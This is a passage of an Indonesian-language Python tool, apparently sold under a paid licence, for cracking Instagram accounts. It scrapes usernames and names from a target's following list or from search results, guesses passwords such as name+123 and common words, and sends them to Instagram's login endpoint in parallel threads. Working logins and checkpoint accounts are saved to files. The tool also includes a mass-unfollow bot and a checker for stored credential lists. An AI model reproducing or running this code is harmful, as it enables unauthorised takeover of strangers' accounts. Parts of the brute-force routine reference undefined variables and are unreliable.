		elif c in ('2','02'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)
		elif c in ('3','03'):
			print ("\n%s%s %sSemakin banyak target semakin banyak id yg terkumpul "%(U,til,O))
			m=int(input('%s%s %sJumlah target%s > %s'%(U,til,O,M,K)))
			print('')
			for i in range(m):
				i+=1
				nama=input('%s•%s %s %sMasukan nama%s > %s'%(U,P,i,O,M,K))
				name=self.searchAPI(self.cookie,nama)
			print ('')
			self.passwordAPI(name)
		elif c in ('4','04'):
			crack_target()
			exit()
		elif c in ('5','05'):
			print('')
			for i in os.listdir('IG'):
				print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
			c=input("\n%s•%s masukan file %s:%s "%(U,O,M,K))
			g=open("IG/%s"%(c)).read().splitlines()
			print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
			print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
			print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
			print("\n%s•%s Mohon tunggu sedang mengecek akun ... "%(U,O))
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
		elif c in ('6','06'):
			global following
			six=0
			print ("\n%s%s %sBot unfollow-All di jalankan "%(U,til,O))
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print (f"{U}{til}{O} {str(six)} {i} {H}Unfollow berhasil √")
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			exit(f'\n {H}√ unfollow selesai ...')
			self.menu()
		elif c in ('rm','RM','Rm'):
			os.remove('.kukis.log')
			os.remove('.username')
			jalan ("\n%s%s berhasil menghapus data login "%(M,til))
			exit()
		elif c in ('0','00'):
			exit()
		else:
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=generateUUID(True)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})
		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text

	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				user=i['user']
				username=user['username']
				fullname=user['full_name']
				internal.append(f'{username}|{fullname}')
		except requests.exceptions.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		return internal

	def idAPI(self,cookie,id):
		try:
			m=s.get('https://www.instagram.com/%s/?__a=1'%(id),cookies=cookie,headers={"user-agent":USN})
			m_jason=m.json()["graphql"]["user"]
			idx=m_jason["id"]
		except requests.exceptions.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		except Exception as e:
			exit('\n%s%s username yg anda masukan salah pastikan target bersifat publik%s\n'%(M,til,N))
		return idx

	def infoAPI(self,cookie,api,id):
		try:
			x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				username = i["username"]
				nama = i["full_name"]
				internal.append(f'{username}|{nama}')
				following.append(username)
		except requests.exceptions.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		except Exception as e:
			exit('\n%s%s username yg anda masukan salah pastikan target bersifat publik%s\n'%(M,til,N))
		return internal

	def passwordAPI(self,xnx):
		print ("\r%s•%s Total user %s> %s%s"%(U,O,M,H,len(internal)))
		print(f"""
{U}{til}{O} [ {U}pilih methode crack, silahkan coba satu²{O} ]

{U}{til}{P} 01 {O}Methode {M}V.1 {O}(fast)
{U}{til}{P} 02 {O}Methode {P}V.2 {O}(slow)
{U}{til}{P} 03 {O}Methode {H}V.3 {O}(very slow)
		""")
		c=input('%s# %sPilih %s> %s'%(P,O,M,K))
		if c=='1':
			self.generateAPI(xnx,c)
		elif c=='2':
			self.generateAPI(xnx,c)
		elif c=='3':
			self.generateAPI(xnx,c)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o):
		print(f"""
{U}{til}{O} [ {U}pilih user-agent, silahkan coba satu²{O} ]

{U}{til}{P} 01 {O}User-Agent 1
{U}{til}{P} 02 {O}User-Agent 2
{U}{til}{P} 03 {O}User-Agent 3
		""")
		ua=input('%s# %sPilih %s> %s'%(P,O,M,K))
		if ua=='1':
			uaAPI=User_Agent()
		elif ua=='2':
			uaAPI=user_agent()
		elif ua=='3':
			uaAPI=user_agentAPI()
		print(f"""
{U}{til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}IG/OK-{day}.txt
{U}{til}{O} akun {M}[{K}CP{M}] {O}tersimpan ke file {M}> {K}IG/CP-{day}.txt
{U}!{O} setiap crack 1k ID, mainkan mode pesawat 3 detik
		""")
		with ThreadPoolExecutor(max_workers=30) as shinkai:
			for i in user:
				try:
					username=i.split("|")[0]
					password=i.split("|")[1].lower()
					for w in password.split(" "):
						if len(w)<3:
							continue
						else:
							w=w.lower()
							if o=="1":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w+'123',w+'12345']
								else:
									sandi=[w+'123',w+'12345']
							elif o=="2":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'12345']
								else:
									sandi=[w,w+'123',w+'12345']
							elif o=="3":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'12345',w,password.lower()]
								else:
									sandi=[w,w+'123',w+'12345',w,password.lower()]
							shinkai.submit(self.crackAPI,username,sandi,uaAPI)
				except:
					pass
		
		os.popen('play-audio data/selesai.mp3')
		exit("\n%s√ finished"%(H))

	def APIinfo(self,user):
		try:
			x=s.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
			x_jason=x.json()["graphql"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			pass
		return nama,pengikut,mengikut,postingan

	def crackAPI(self,user,pas,uaAPI):
		global loop,success,checkpoint
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]    '%(loop,len(internal),H,M,H,len(success),O,K,M,K,len(checkpoint),O)),
		sys.stdout.flush()
		try:
			for pw in pas:
				token=s.get('https://www.instagram.com/accounts/login/')
				headers = {
					'Host': 'www.instagram.com',
					'User-Agent': uaAPI,
					'Accept': '/',
					'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
					'Accept-Encoding': 'gzip, deflate, br',
					'X-CSRFToken': token.cookies['csrftoken'],
					'X-Instagram-AJAX': '1d6caaf37cd2',
					'X-IG-App-ID': '936619743392459',
					'X-ASBD-ID': '437806',
					'X-IG-WWW-Claim': '0',
					'Content-Type': 'application/x-www-form-urlencoded',
					'X-Requested-With': 'XMLHttpRequest',
					'Content-Length': '347',
					'Origin': 'https://www.instagram.com',
					'Connection': 'keep-alive',
					'Referer': 'https://www.instagram.com/accounts/login/'
				}
				param={
                    "username": user,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}}
				x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param)
				x_jason=json.loads(x.text)
				if "userId" in str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Username  {M}> {H}{user}
{J}║══[{H} Password  {M}> {H}{pw}
{J}║══[{H} Followers {M}> {H}{pengikut}
{J}╚══[{H} Following {M}> {H}{mengikut}
					""")
					os.popen("play-audio dapet.mp3")
					open(f"IG/OK-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'checkpoint_url' in str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r{J}╔══[ {K}Checkpoint                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Username  {M}> {K}{user}
{J}║══[{K} Password  {M}> {K}{pw}
{J}║══[{K} Followers {M}> {K}{pengikut}
{J}╚══[{K} Following {M}> {K}{mengikut}
					""")
					os.popen("play-audio dapet.mp3")
					open(f"IG/CP-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' in str(x.text):
					sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
					self.crackAPI(user,pas,uaAPI)
				else:
					continue
			loop+=1
		except:
			self.crackAPI(user,pas,uaAPI)

	def checkAPI(self,user,pw):
		try:
			token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			s.headers.update({
				'authority': 'www.instagram.com',
				'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
				'x-instagram-ajax': '82a581bb9399',
				'content-type': 'application/x-www-form-urlencoded',
				'accept': '*/*',
				'user-agent': user_agent(),
				'x-requested-with': 'XMLHttpRequest',
				'x-csrftoken': crf_token,
				'x-ig-app-id': '936619743392459',
				'origin': 'https://www.instagram.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
			})
			param={
				"username": user,
				"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
				"optIntoOneTap": False,
				"queryParams": {},
				"stopDeletionNonce": "",
				"trustedDeviceRecords": {}
			}
			x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
			x_jason=json.loads(x.text)
			if "userId" in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r   
{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Username  {M}> {H}{user}
{J}║══[{H} Password  {M}> {H}{pw}
{J}║══[{H} Followers  {M}> {H}{pengikut}
{J}║══[{H} Following  {M}> {H}{mengikut}
{J}╚══[{H} Postingan  {M}> {H}{postingan}
				""")
				os.popen("play-audio dapet.mp3")
			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r  
{J}╔══[ {K}Checkpoint                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Username  {M}> {K}{user}
{J}║══[{K} Password  {M}> {K}{pw}
{J}║══[{K} Followers  {M}> {K}{pengikut}
{J}║══[{K} Following  {M}> {K}{mengikut}
{J}╚══[{K} Postingan  {M}> {K}{postingan}
				""")
			elif 'Please wait a few minutes' in str(x.text):
				sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
				self.checkAPI(user,pw)
		except:
			self.checkAPI(user,pw)
			
looping=1
def infohhh(username_dev, pass_dev, status):
	try:
		global id_, pengikut, mengikuti, nama
		da = requests.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
		data_us_dev = da.json()["graphql"]["user"]
		nama = data_us_dev["full_name"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
	except requests.exceptions.ConnectionError:
		if status == "":
			exit("\n%s• Tidak ada koneksi internet \n"%(M))
		else:
			print ("\r%s• %s : %s > %s             \n"%(M,status,username_dev,pass_dev))
			pass
	except ValueError:
		if status == "":
			exit("\n%s• IP anda terkena spam, mode pesawat 3 detik \n"%(M))
		else:
			print ("\r%s• %s : %s > %s             \n"%(M,status,username_dev,pass_dev))
			pass
	except:
		print ("\r%s• %s : %s > %s             \n"%(M,status,username_dev,pass_dev))
		pass
		
# CRACK TARGET
def crack_target():
	pw_none = ""
	status_none = ""
	word_list = []
	word_list_crack = []
	user_target = input('\n%s%s %sUsername target%s > %s'%(U,til,O,M,K))
	time.sleep(2)
	jalan ("%s%s%s Mohon tunggu ... "%(M,til,O))
	infohhh(user_target, pw_none, status_none)
	nama_pecah = nama.split()
	angka = [123,1234,12345]
	word_list.append(nama.replace(" ", ""))
	word_list.append(nama)
	for dev in angka:
		if len(nama_pecah) >= 2:
			word_list.append(nama.replace(" ", "")+str(dev))
		if len(nama_pecah) >= 1:
			for sub_dev in nama_pecah:
				word_list.append(sub_dev)
				word_list.append(sub_dev+str(dev))
		if len(nama_pecah) >= 2:
			word_list.append(nama_pecah[0]+nama_pecah[1])
			for dev_ in angka:
				word_list.append(nama_pecah[0]+nama_pecah[1]+str(dev_))
			word_list.append(nama_pecah[1]+nama_pecah[0])
			for dev_ in angka:
				word_list.append(nama_pecah[1]+nama_pecah[0]+str(dev_))
	word_list.append(user_target)
	for iq in set(word_list):
		if len(iq) >= 6:
			word_list_crack.append(iq)
	pw_tambahan = ["sayang", "iloveyou", "bismillah", "anjing", "bangsat", "bajingan", "rahasia", "katasandi", "password", "kontol", "123456","12345678", "123456789"]
	for f in pw_tambahan:
		word_list_crack.append(f)
	print ("%s%s%s berhasil membuat kata sandi "%(U,til,O));jeda(2)
	print 
	brute(user_target, word_list_crack)
	exit()
	
def brute(email_dev, san_dev_):
	for san_dev_1 in san_dev_:
		try:
			global looping
			san_dev = san_dev_1.lower()
			with requests.Session() as dev:
				pas = q[0]
				url_scrap = "https://www.instagram.com/"
				user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
				headerz = {"User-Agent": user_agentz_api}
				data = dev.get(url_scrap+post_, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": crf_token,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
				param = {"username": email_dev,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), san_dev,y),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}}
			print (P+" "+str(c)+"."+O+" password"+M+" > "+K+san_dev+"                ")
			with requests.Session() as ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url+post_+y, data=param, headers=header)
				data_dev = json.loads(respon.content)
				l = q.replace(q, "")
				if "checkpoint_url" in str(data_dev):
					print (f"""{J}╔══[ {K}Checkpoint                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Username  {M}> {K}{email_dev}
{J}║══[{K} Password  {M}> {K}{san_dev}
{J}║══[{K} Followers  {M}> {K}{str(pengikut)}
{J}╚══[{K} Following  {M}> {K}{str(mengikuti)}
					""")
					break
				elif "userId" in str(data_dev):
					print (f"""{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Username  {M}> {H}{email_dev}
{J}║══[{H} Password  {M}> {H}{san_dev}
{J}║══[{H} Followers  {M}> {H}{str(pengikut)}
{J}╚══[{H} Following  {M}> {H}{str(mengikuti)}
					""")
					break
				elif "Please wait" in str(data_dev):					
					print ("\r%s! Mode pesawatkan 2 detik  "%(M))
					san_dev_split = san_dev.split()
					brute(email_dev, san_dev_split)
				else:
					pass
					looping+=1
		except requests.exceptions.ConnectionError:
			san_dev_split = san_dev.split()
			brute(email_dev, san_dev_split)
		except KeyboardInterrupt:
			exit("%s• Keluar...."%(M))
		except:
			pass
			
# LISENSI
def get_license(integer):
    lis = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789")
    gets = [random.choice(lis) for _ in range(integer)]
    return "".join(gets).upper()

class key:
	
	def __init__(self):
		self=[]
	
	def konfirmasi(self):
		os.system("clear")
		banner()
		print('\n')
		print ('\x1b[1;95m•\x1b[1;96m Mohon tunggu ...');jeda(1)
		digit = random.choice([20])
		id = get_license(digit)
		lpg = open('data/lisensi.txt', 'w')
		lpg.write(id)
		lpg.close()
		print ("\n\n%s•%s Daftar list harga %s:"%(U,O,M));jeda(0.07)
		print ("  %s-%s 20k 1 minggu"%(P,O));jeda(0.07)
		print ("  %s-%s 60k 1 bulan"%(P,O));jeda(0.07)
		jalan ('\n%s• %sLisensi%s : %s%s'%(U,O,M,H,id));jeda(1)
		jalan ('%s• %sLisensi Belum Di konfirmasi'%(U,O))
		suh=input("\n%s•%s ingin beli lisensi? y/t %s: %s"%(U,O,M,K))
		if suh in['']:
			exit()
		elif suh in["y","Y"]:
			jalan ("\n%s•%s menuju ke whatsap untuk membeli lisensi "%(U,O))
			jalan ("%s•%s no whatsap saya %s: %s+6282371648186 "%(U,O,M,H))
			os.system('am start https://wa.me/+6282371648186?text=Assalamualaikum+saya+ingin+beli+lisensi:+'+id+'>/dev/null');jeda(1)
			exit()
		elif suh in["t","T"]:
			exit()
		elif suh in["python2 bff-2.py"]:
			menu()
		else:
			exit()

if __name__=='__main__':
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	os.system('git pull')
	os.system('clear')
	login()
